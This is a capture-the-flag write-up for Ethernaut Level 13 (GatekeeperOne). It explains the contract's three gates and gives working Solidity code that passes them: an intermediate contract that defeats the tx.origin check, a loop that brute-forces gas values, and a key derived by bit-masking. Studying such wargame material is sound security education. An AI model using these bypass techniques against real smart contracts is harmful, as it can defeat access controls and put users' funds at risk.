# Ethernaut Level 13 GatekeeperOne

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

We have to pass three gates to register as an entrant. From `gateOne()` modifier we can see that we have to create a middle layer contract so that `msg.sender` is the middle layer contract which calls the function `enter` while `tx.origin` is our EOA. `gateTwo()` indicates that when calling the function `enter`, gas that left has to be exactly a multiple of 8191. However, we cannot know how much gas will take when calling the function. So we have to somehow *brute force* a value that can meet the requirement.

`gateThree()` contains three requirements regarding `bytes8 _gateKey`. From these requirements, we can know that:

1. The lower 2 bytes of the key must equal the lower 4 bytes of the key. (This means that the third and fourth lower bytes should be all 0)
2. The key must *not* be equal to its lower 4 bytes (so upper bits must not all be zero).
3. The lower 2 bytes must equal the lower 16 bits of tx.origin. 

So we can basically form a key by using a mask like this: `0xFFFFFFFF0000FFFF` (each byte has two byte chars).

`MiddleLayer.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MiddleLayer {
    
    function callEnter(address gatekeeperAddress) public {
        bool success = false;
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (success, ) = gatekeeperAddress.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
        require(success, "call failed");
    }
}
```

To get the key as input, we first transform the address of EOA into `uint160`, and then taking the last 8 bytes to apply it to the mask `0xFFFFFFFF0000FFFF`. Also, in order to make `gasleft()` a multiple of 8191, we can calculate the gas by using a formula `k * 8191 + offset`. The offset shall be the gas used during the calling process. We use a for loop to *brute force* the offset so that we can finally have a successful call.

`GatekeeperOne.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";   
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {MiddleLayer} from "../src/MiddleLayer.sol";

contract GatekeeperOneScript is Script {
    GatekeeperOne gatekeeper = GatekeeperOne(0xXXXXXXXXXXXXX);
    MiddleLayer middleLayer;

    function run() external {
        vm.startBroadcast();
        middleLayer = new MiddleLayer();
        middleLayer.callEnter(address(gatekeeper));
        vm.stopBroadcast();
        console.log("Entrant:", gatekeeper.entrant());
    }
}
```

